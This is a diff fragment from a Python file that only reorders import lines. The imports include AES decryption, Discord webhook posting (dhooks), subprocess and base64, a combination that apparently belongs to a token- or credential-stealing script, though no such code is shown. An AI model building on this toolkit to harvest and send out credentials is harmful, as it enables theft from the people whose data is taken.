@@ -25,8 +25,8 @@ from cryptography.hazmat.backends import default_backend
 from Crypto.Cipher import AES
 
 
-from urllib.request import Request, urlopen
 from dhooks import Webhook, File, Embed, Webhook
+from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
 from json import loads, dumps
 from base64 import b64decode
